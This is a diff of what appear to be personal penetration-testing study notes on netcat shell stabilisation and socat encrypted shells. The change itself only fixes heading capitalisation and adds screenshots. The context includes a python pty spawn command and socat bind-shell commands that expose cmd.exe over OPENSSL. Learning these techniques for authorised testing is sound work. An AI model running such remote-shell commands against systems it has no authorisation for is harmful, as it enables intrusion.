@@ -16,7 +16,7 @@ The important thing to understand here is that we are listening on the target, t
 
 2. non-interactive: In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly, like whoami for example.
 
-# netcat shells stabilisation
+# Netcat shells stabilisation
 ### python
 1. first step is `python -c 'import pty;pty.spawn("/bin/bash")'` which gets us a better featured bash shell. we might need to replace python with python2 or python3 as required.
 2. second step is: `export TERM=xterm` -- this will give us access to term commands such as clear.
@@ -58,10 +58,10 @@ The first part is easy -- we're linking up with the listener running on our own 
 - setsid, creates the process in a new session
 - sane, stabilises the terminal, attempting to "normalise" it.
 
-### Example: (attacker< >target)
-![image](https://github.com/user-attachments/assets/8ac883f6-5955-42d7-986b-c18692ab4bb3)
+  ### Example: (attacker< >target)
+  ![image](https://github.com/user-attachments/assets/8ac883f6-5955-42d7-986b-c18692ab4bb3)
 
-### encrypted shells
+### Encrypted shells
 Socat is capable of creating encrypted shells -- both bind and reverse. Suffice to say that any time TCP was used as part of a command, this should be replaced with OPENSSL when working with encrypted shells. 
 
 Steps to use the feature:
@@ -72,3 +72,6 @@ Steps to use the feature:
 5. The same technique would apply for a bind shell:
   - Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
   - Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`
+
+  ### Example: (attacker< >target)
+  ![image](https://github.com/user-attachments/assets/8992c65c-aead-4452-bb6a-aeea142ae7a9)
